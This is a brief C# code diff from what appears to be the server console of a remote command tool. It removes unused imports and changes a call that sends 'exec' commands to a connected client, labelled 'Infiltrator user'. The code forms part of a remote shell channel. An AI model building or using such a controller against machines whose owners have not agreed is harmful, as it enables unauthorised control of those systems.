@@ -1,13 +1,4 @@
-﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
-using System.Net.Sockets;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows.Forms;
+﻿using System.Net.Sockets;
 using Server.Conexion;
 
 
@@ -40,10 +31,9 @@ namespace Server
             if (!string.IsNullOrEmpty(command)) {
 
                 ServerSocket.setWaiting(true);
-                ServerSocket.SendCommand(_idCliente, "exec "+command);
+                ServerSocket.SendCommand(_idCliente, "exec "+command,Channel.CommandOutput);
                 richTextBox1.AppendText("Infiltrator user > " + command + "\n");
                 textBox1.Clear();
-
             }
         }
 
